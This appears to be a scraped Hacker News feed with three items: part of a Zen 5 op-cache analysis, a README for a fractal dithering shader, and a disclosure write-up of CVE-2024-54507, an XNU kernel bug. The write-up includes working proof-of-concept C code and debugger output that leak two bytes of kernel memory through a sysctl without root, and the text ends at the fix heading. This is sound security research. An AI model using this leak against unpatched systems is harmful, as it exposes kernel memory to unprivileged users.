1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Cinebench 2024 sees its op cache hitrate drop to 78.1% in multi-threaded mode, highlighting how multiple threads put extra pressure on cache capacity. During certain 1-second intervals, hitrate can drop below 70%. Even though the op cache continues to do most of the work, Cinebench 2024’s multithreaded mode taps into the decoders a little more than other workloads here.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png" width="1456" height="753" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:753,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:265641,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5f741352-66a9-42c0-b84c-97c1db2ec544_1806x934.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Dividing counts for event 0xAA by total core cycles (4.4G * 12 cores) because active cycles are counted per-thread</figcaption></figure></div><p>Disabling the op cache dumps a lot more load onto the decoders, but having two decode clusters lets the frontend handle it well. The decoders still can’t do as well as the op cache, and the frontend is a bit busier in pure-decoder mode. But as the overall performance results show, the decoders are still mostly keeping up.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png" width="1456" height="709" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:709,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:308919,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F84ceae6a-15a2-4a63-bca5-e96435a6c903_1809x881.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Turning off Zen 5’s op cache offers a glimpse of how a modern core may perform when fed from a Steamroller-style decoder layout. With two 4-wide decoders, single threaded performance isn’t great, but SMT performance is very good. Single threaded performance is still of paramount performance in client workloads, many of which can’t take advantage of high core counts, let alone SMT threads. Zen 5’s op cache therefore plays an important role in letting Zen 5 perform well. No one would design a modern high performance core fed purely off a Steamroller-style frontend, and it’s clear why.</p><p>But this kind of dual cluster decoder does have its place. Two threads present the core with a larger cache footprint, and that applies to the instruction side too. Zen 5’s op cache is very often large enough to cover the vast majority of the instruction stream, even with both SMT threads in use. However, there are cases like Cinebench 2024 where the decoders sometimes have work to do.</p><p>I think Zen 5’s clustered decoder targets these workloads. It takes a leaf out of Steamroller’s over-engineered frontend, and uses it to narrowly address cases where core IPC is likely to be high and code locality is likely poor. Specifically, that’s the SMT case. The clustered decoder is likely part of AMD’s strategy to cover as many bases as possible with a single core design. Zen 5’s improved op cache focuses on maximizing single threaded performance, while the decoders step in for certain multithreaded workloads where the op cache isn’t big enough.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png" width="1456" height="951" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:951,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:3714731,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae34ff65-6859-4651-a412-39fcb0953d45_2342x1530.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>The test </span><s>victim</s><span> subject for this article. It’s ok, it’s over now. I’ll turn your op cache back on in a moment</span></figcaption></figure></div><p>In the moment, Zen 5’s frontend setup makes a lot of sense. Optimizing a CPU design is all about striking the right balance. Zen 5’s competitive performance speaks for itself. But if we step back a few months to Hot Chips 2024, AMD, Intel, and Qualcomm all gave presentations on high performance cores there. All three were eight-wide, meaning their pipelines could handle up to eight micro-ops per cycle in a sustained fashion.</p><p>Zen 5 is the only core out of the three that couldn’t give eight decode slots to a single thread. Intel’s Lion Cove might not take the gaming crown, but Intel’s ability to run a plain 8-wide decoder at 5.7 GHz should turn some heads. For now, that advantage doesn’t seem to show up. I haven’t seen a high IPC, low-threaded workload with a giant instruction-side cache footprint. But who knows what the future will bring.</p><p><span>If you like the content then consider heading over to the </span><a href="https://www.patreon.com/ChipsandCheese" rel="">Patreon</a><span> or </span><a href="https://www.paypal.com/donate/?hosted_button_id=4EMPH66SBGVSQ" rel="">PayPal</a><span> if you want to toss a few bucks to Chips and Cheese. Also consider joining the </span><a href="https://discord.gg/TwVnRhxgY2" rel="">Discord</a><span>.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Surface-Stable Fractal Dithering (167 pts)]]></title>
            <link>https://github.com/runevision/Dither3D</link>
            <guid>42808889</guid>
            <pubDate>Thu, 23 Jan 2025 22:50:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/runevision/Dither3D">https://github.com/runevision/Dither3D</a>, See on <a href="https://news.ycombinator.com/item?id=42808889">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Surface-Stable Fractal Dithering</h2><a id="user-content-surface-stable-fractal-dithering" aria-label="Permalink: Surface-Stable Fractal Dithering" href="#surface-stable-fractal-dithering"></a></p>
<p dir="auto">Surface-Stable Fractal Dithering is a novel form of dithering invented by Rune Skovbo Johansen for use on surfaces in 3D scenes.</p>
<p dir="auto">What's unique about it is that the dots in the dither patterns stick to surfaces, and yet the dot sizes and spacing remain approximately constant on the screen, even as surfaces move closer by or further away. This is achieved by dynamically adding or removing dots as needed.</p>
<p dir="auto">Here's a video explaining how it works:</p>
<p dir="auto"><a href="https://www.youtube.com/watch?v=HPqGaIMVuLs" rel="nofollow"><img src="https://camo.githubusercontent.com/04eac3aac9b70b4b4f9c240b2a2358bc22455d2cc88f0bde74697fe84eebd249/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f4850714761494d56754c732f302e6a7067" alt="Surface-Stable Fractal Dithering video on YouTube" data-canonical-src="https://img.youtube.com/vi/HPqGaIMVuLs/0.jpg"></a></p>
<p dir="auto">This repository contains the shader and texture source files, and a Unity example project demonstrating their use. The example project is made with Unity 2019.4 and is also tested in Unity 2022.3.</p>
<p dir="auto">The core implementation is located in the folder <code>Assets/Dither3D</code>. The remaining files relate to the Unity example project.</p>
<p dir="auto">The original version of this repository can be found at:<br>
<a href="https://github.com/runevision/Dither3D">https://github.com/runevision/Dither3D</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Dither Properties</h2><a id="user-content-dither-properties" aria-label="Permalink: Dither Properties" href="#dither-properties"></a></p>
<p dir="auto">Each material that uses the dithering has the following dither-specific number properties:</p>
<p dir="auto"><strong>Dither Input Brightness</strong></p>
<ul dir="auto">
<li><code>Exposure</code><br>
Exposure to apply to input brightness (default 1).</li>
<li><code>Offset</code><br>
Offset to apply to input brightness (default 0).</li>
</ul>
<p dir="auto"><strong>Dither Settings</strong></p>
<ul dir="auto">
<li><code>Dot Scale</code><br>
Value that exponentially scales the dots.</li>
<li><code>Dot Size Variability</code><br>
0 = shading controls dot count "Bayer style" (default);<br>
1 = shading controls dot sizes "half-tone style".</li>
<li><code>Dot Contrast</code><br>
A value of 1 produces perfect anti-aliasing (default 1).</li>
<li><code>Stretch Smoothness</code><br>
How much to smooth anisotropic dots (default 1).</li>
</ul>
<p dir="auto"><strong>Global Options</strong></p>
<p dir="auto">Furthermore, the following global toggle properties can be set via the <code>Dither3DGlobalProperties</code> component:</p>
<ul dir="auto">
<li><code>Radial Compensation</code><br>
When using a perspective camera, dots must be larger towards the edge of the screen in order to be stable under camera rotation. The Radial Compensation feature can be enabled to achieve this.</li>
<li><code>Quantize Layers</code><br>
When disabled, dots may grow or shrink in size when they appear or disappear, respectively. Even when enabled, dots may still be partially cut off, but that's a separate and unavoidable effect.</li>
<li><code>Debug Fractal</code><br>
Displays an overlay effect showing the pattern size, when enabled.</li>
</ul>
<p dir="auto">The <code>Dither3DGlobalProperties</code> component can also be used to override the non-global properties of all dither materials at once.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Files</h2><a id="user-content-files" aria-label="Permalink: Files" href="#files"></a></p>
<p dir="auto">A brief overview of the files in the <code>Assets/Dither3D</code> folder:</p>
<p dir="auto">The central shader include file with the dithering implementation:</p>
<ul dir="auto">
<li><code>Dither3DInclude.cginc</code></li>
</ul>
<p dir="auto">Included shader files that use the dithering implementation:</p>
<ul dir="auto">
<li><code>Dither3DOpaque.shader</code></li>
<li><code>Dither3DCutout.shader</code></li>
<li><code>Dither3DParticleAdd.shader</code></li>
<li><code>Dither3DSkybox.shader</code></li>
</ul>
<p dir="auto">The dither shaders rely on a 3D texture with dither patterns. These come in several versions with different amounts of dots. In the materials using the dither shaders, you can freely switch between these 3D textures.</p>
<ul dir="auto">
<li><code>Dither3D_1x1.asset</code></li>
<li><code>Dither3D_2x2.asset</code></li>
<li><code>Dither3D_4x4.asset</code></li>
<li><code>Dither3D_8x8.asset</code></li>
</ul>
<p dir="auto">Although the 3D textures are available in the repository, a script is also included which can generate them from scratch. You can do this by using the menu items under the grouping <code>Assets/Create/Dither 3D Texture/...</code>.</p>
<ul dir="auto">
<li><code>Dither3DTextureMaker.cs</code></li>
</ul>
<p dir="auto">The script also generates PNG image files, where the different layers are laid out bottom to top. These PNG files are not used for anything and can be safely deleted, but they are easier to inspect and study than the native 3D textures. Note that later versions of Unity can in principle import 3D textures from such 2D images, but due to an inconsistency between Unity's 3D texture API and their 3D texture importer, the layers will appear in reverse order if this is attempted, and this will cause the fractal dithering effect to not work.</p>
<ul dir="auto">
<li><code>Dither3D_1x1.png</code></li>
<li><code>Dither3D_2x2.png</code></li>
<li><code>Dither3D_4x4.png</code></li>
<li><code>Dither3D_8x8.png</code></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">This Surface-Stable Fractal Dithering implementation is licensed under the <a href="https://mozilla.org/MPL/2.0/" rel="nofollow">Mozilla Public License, v. 2.0</a>.</p>
<p dir="auto">You can read a summary <a href="https://choosealicense.com/licenses/mpl-2.0/" rel="nofollow">here</a>. In short: If you make changes/improvements to this Surface-Stable Fractal Dithering implementation, you must share those for free with the community. But the rest of the source code for your game or application is not subject to this license, so there's nothing preventing you from creating proprietary and commercial games that use this Surface-Stable Fractal Dithering implementation.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Susctl CVE-2024-54507: A particularly 'sus' sysctl in the XNU kernel (141 pts)]]></title>
            <link>https://jprx.io/cve-2024-54507/</link>
            <guid>42808801</guid>
            <pubDate>Thu, 23 Jan 2025 22:37:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jprx.io/cve-2024-54507/">https://jprx.io/cve-2024-54507/</a>, See on <a href="https://news.ycombinator.com/item?id=42808801">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
      <p><a href="https://jprx.io/">&lt; Home</a>
      <a id="modeswitch" href="#" onclick="SwitchMode();">Light Mode</a></p><center>

<h2>SUSCTL (CVE-2024-54507)</h2>

<h3>A particularly 'sus' sysctl in the XNU Kernel</h3>

<pre>The kernel might just be an impostor.
</pre>

</center>

<p><a href="https://github.com/jprx/CVE-2024-54507">TLDR: here is a PoC</a>.</p>

<p>Every time Apple releases a new version of XNU, I run a custom suite of tests under an address sanitizer to see if I can spot any regressions, or even possibly new bugs.
When I was messing around with macOS 15.0, I was shocked to see a very simple command was causing the sanitizer to report an invalid load.</p>

<p>If you run <code>sysctl -a</code> on macOS 15.0 running with KASAN, you'll see a crash like the following:</p>

<pre>panic(cpu 0): KASan: invalid 4-byte load [PARTIAL2]
 @kasan-report.c:114
Panicked task 0xffffff86aa0fc800: 1 threads: pid 602: sysctl
Backtrace (CPU 0), panicked thread: 0xffffff869afa90d0, Frame : Return Address
0xffffffff011ff450 : 0xffffff801849b53b mach_kernel : _handle_debugger_trap + 0x4bb
0xffffffff011ff4b0 : 0xffffff8018a0313a mach_kernel : _kdp_i386_trap + 0x15a
0xffffffff011ff4f0 : 0xffffff80189e9c13 mach_kernel : _kernel_trap + 0xe23
0xffffffff011ff680 : 0xffffff8018a0d051 mach_kernel : trap_from_kernel + 0x26
0xffffffff011ff6a0 : 0xffffff801849ab1a mach_kernel : _DebuggerTrapWithState + 0x9a
0xffffffff011ff7d0 : 0xffffff801849bbff mach_kernel : _panic_trap_to_debugger + 0x2af
0xffffffff011ff840 : 0xffffff801a130ec4 mach_kernel : _panic + 0x8a
0xffffffff011ff930 : 0xffffff801a15e783 mach_kernel : _kasan_report_internal.cold.1 + 0x23
0xffffffff011ff940 : 0xffffff801a1257a9 mach_kernel : _kasan_report_internal + 0x279
0xffffffff011ff9b0 : 0xffffff801a12528b mach_kernel : _kasan_crash_report + 0x2b
0xffffffff011ff9e0 : 0xffffff801a125995 mach_kernel : ___asan_report_load4 + 0x15
0xffffffff011ff9f0 : 0xffffff80192e23e4 mach_kernel : _sysctl_udp_log_port + 0x244
0xffffffff011ffad0 : 0xffffff801970b81c mach_kernel : _sysctl_root + 0xf4c
0xffffffff011ffc80 : 0xffffff801970c197 mach_kernel : _sysctl + 0x577
0xffffffff011ffed0 : 0xffffff8019c143b2 mach_kernel : _unix_syscall64 + 0x492
0xffffffff011fffa0 : 0xffffff8018a0d496 mach_kernel : _hndl_unix_scall64 + 0x16

Process name corresponding to current thread: sysctl
</pre>

<p>In case you aren't familiar with sysctl's, they are basically a set of runtime-controllable kernel variables that you can adjust from userspace.
A lot of the time, the underlying resource of a given sysctl is literally just an integer in the kernel somewhere (like <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.1.10/bsd/netinet/udp_log.c#L56">this</a>).
They're commonly used in kernel programming as a quick way to adjust parameters, and are used all over XNU.</p>

<p>Running <code>sysctl -a</code> will enumerate all sysctl's in the system.
Somehow, doing this causes an invalid load.</p>

<p>There are a variety of ways to declare a sysctl using macros from <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.1.10/bsd/sys/sysctl.h#L318"><code>sysctl.h</code></a> with support for many common types, such as <code>int</code>'s or <code>struct</code>'s.
These handle all the boilerplate for you of copying in values from userspace / copying kernel values out, and provide some security flags as well.</p>

<p>The more interesting kind of sysctl is <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.1.10/bsd/sys/sysctl.h#L525"><code>SYSCTL_PROC</code></a>, where a custom handler is used to service the sysctl instead of the kernel-supplied boilerplate.
When writing a <code>SYSCTL_PROC</code>, you are responsible for validating user requests, updating the kernel state, and returning values to userspace.</p>

<p>You can read more about writing implementing sysctl's <a href="https://freebsdfoundation.org/wp-content/uploads/2014/01/Implementing-System-Control-Nodes-sysctl.pdf">here</a> [1].</p>

<h2>The Bug</h2>

<p>That brings us to our bug.
<a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.1.10/bsd/netinet/udp_log.c#L435"><code>sysctl_udp_log_port</code></a> is one of those <code>SYSCTL_PROC</code> handlers, and is also the function in our backtrace causing a PARTIAL2 KASAN load violation.
This handler is shared by four unique sysctl's:</p>

<ul>
<li><code>net.inet.udp.log.local_port_included</code></li>
<li><code>net.inet.udp.log.remote_port_included</code></li>
<li><code>net.inet.udp.log.local_port_excluded</code></li>
<li><code>net.inet.udp.log.remote_port_excluded</code></li>
</ul>

<p>Each of these sysctl's maps to a 2-byte <code>uint16_t</code> in the kernel defined in <a href="https://github.com/apple-oss-distributions/xnu/blob/xnu-11215.1.10/bsd/netinet/udp_log.c#L73"><code>udp_log.c</code></a>.
The relationship between the user-visible sysctl name and the kernel variable is established using the <code>SYSCTL_PROC</code> macro.</p>

<p>When the user tries to read from or write to one of these four sysctl's, the handler method (where the bug is) is called.
Let's take a look at the source of this handler function.
According to the address sanitizer, we are loading 2 bytes too many- can you see why?</p>

<pre>static int
sysctl_udp_log_port SYSCTL_HANDLER_ARGS
{
#pragma unused(arg1, arg2)
    int error;
    int new_value = *(int *)oidp-&gt;oid_arg1;

    error = sysctl_handle_int(oidp, &amp;new_value, 0, req);
    if (error != 0) {
        return error;
    }
    if (new_value &lt; 0 || new_value &gt; UINT16_MAX) {
        return EINVAL;
    }
    *(uint16_t *)oidp-&gt;oid_arg1 = (uint16_t)new_value;

    return 0;
}
</pre>

<p>When <code>sysctl_udp_log_port</code> is invoked, <code>oidp-&gt;oid_arg1</code> will point to one of the four <code>uint16_t</code>'s from above, depending on which sysctl was requested.
This function mostly just wraps <code>sysctl_handle_int</code>, which both validates the user requested new value for the sysctl (writing it into <code>new_value</code>), and simultaneously copies out the current value of the sysctl to userspace.</p>

<p>Before storing the new value back into the underlying <code>uint16_t</code> variable, the kernel checks if we are about to cause an overflow (returning <code>EINVAL</code> if so).
If <code>new_value</code> is less than 0 or more than <code>UINT16_MAX</code>, we return <code>EINVAL</code> and do not update <code>oid_arg1</code>.
Otherwise, we write <code>new_value</code> to <code>oid_arg1</code>, treating it as a properly sized <code>uint16_t</code>.
This check is sufficient to prevent overwrites, but an overread has already occurred...</p>

<h2>Integer Type Confusion</h2>

<p>The bug is that when we load <code>oidp-&gt;oid_arg1</code> into <code>new_value</code>, we treat it as an integer pointer (4 bytes), rather than a <code>uint16_t</code> pointer (2 bytes).
That's why we observed 2 bytes of out-of-bounds data being read when we ran <code>sysctl -a</code>.</p>

<pre>int new_value = *(int *)oidp-&gt;oid_arg1; // Out-of-bounds read because oid_arg1 is a u16, not i32
</pre>

<p>Then, when we call <code>sysctl_handle_int</code>, we pass the OOB read data back to userspace.
Even though we detect the overflow and return <code>EINVAL</code>, the OOB read has already occurred, and is visible from userspace!</p>

<h2>Leaking (2 bytes of) Kernel Memory</h2>

<p>We can leak two bytes of kernel memory by simply reading from the last sysctl in memory (<code>remote_port_excluded</code>).
This sysctl can be read without root.</p>

<pre>void leak() {
    uint64_t val = 0;
    size_t len = sizeof(val);
    sysctlbyname("net.inet.udp.log.remote_port_excluded", &amp;val, &amp;len, NULL, 0);
    printf("leaked: 0x%X 0x%X\n", (val &gt;&gt; 16) &amp; 0x0FF, (val &gt;&gt; 24) &amp; 0x0FF);
}
</pre>

<p>I tried this on an <code>xnu-11215.1.10</code> VMAPPLE ARM64 release flavor kernel that I <a href="https://github.com/blacktop/darwin-xnu-build">compiled locally</a>.
In the kernel that I compiled I observed <code>net.inet.udp.log_in_vain</code>, some random other sysctl, placed directly after <code>remote_port_excluded</code>.
As ARM64 is little-endian, we can leak the two least significant bytes of this variable.</p>

<pre>% sysctl net.inet.udp.log_in_vain
net.inet.udp.log_in_vain: 0
% ./leak
leaked: 0x0 0x0
% sudo sysctl net.inet.udp.log_in_vain=0x1234
net.inet.udp.log_in_vain: 0 -&gt; 4660
% ./leak
leaked: 0x34 0x12
</pre>

<p>Let's take a look at this in a debugger.
I attached a debugger and used it to set the two bytes after <code>udp_log_remote_port_excluded</code> (at <code>0xfffffe002cbf9e8c</code>) to <code>0xABCD</code>.
We should not be able to read these from userspace.</p>

<pre>(lldb) p &amp;udp_log_remote_port_excluded
(uint16_t *) 0xfffffe002cbf9e8a
(lldb) x/4bx 0xfffffe002cbf9e8a
0xfffffe002cbf9e8a: 0x00 0x00 0x00 0x00
(lldb) memory write 0xfffffe002cbf9e8c -s 2 0xABCD
(lldb) x/4bx 0xfffffe002cbf9e8a
0xfffffe002cbf9e8a: 0x00 0x00 0xcd 0xab
                    ────┬──── ────┬────
     udp log remote ────┘         └──── leak
     port excluded                      this
</pre>

<p>Then, I ran <code>leak()</code> and observed the leakage of data beyond the end of <code>udp_log_remote_port_excluded</code>:</p>

<pre>% ./leak
leaked: 0xCD 0xAB
</pre>

<h2>What can we leak?</h2>

<p>"It depends(TM)".</p>

<p><code>udp_log.o</code>'s common section only has four things in it- those four <code>uint16_t</code>'s.
For each of them, we can leak 2 extra bytes.
As they are all laid out sequentially in memory, the first 3 <code>uint16_t</code>'s only give us the next successive variable, which we can already read.
However, the last one (<code>remote_port_excluded</code>) leaks 2 bytes of whatever the linker decides to put after <code>udp_log.o</code>.</p>

<p>Here is what this looks like in memory:</p>

<pre>udp_log.o's __common section:
┌──────────────────────┐
│  local_port_included │+0
├──────────────────────┤
│ remote_port_included │+2
├──────────────────────┤
│  local_port_excluded │+4
├──────────────────────┤
│ remote_port_excluded │+6
├──────────────────────┤ &lt;- udp_log.o ends here
│         ???          │+8 &lt;- We leak this
└──────────────────────┘
</pre>

<p>So, it's totally up to the linker what will be contained by those two bytes.
On the kernel I built myself, this was some other sysctl, but on the kernel from the KDK I found that unused padding bytes were put there instead.</p>

<p>The linker's behavior is highly sensitive to build configurations and platform differences, so different XNU platforms will probably have different things placed there.</p>

<p>Bottom line is you get the two bytes after <code>udp_log_remote_port_excluded</code>, whatever they may be.</p>

<h2>Fix Patch</h2>

<p>At the time of writing, the source code for <code>xnu-11215.61.5</code> (the version with the fix) is not out yet.
When I reported this bug to Apple, I provided the following suggested fix.</p>

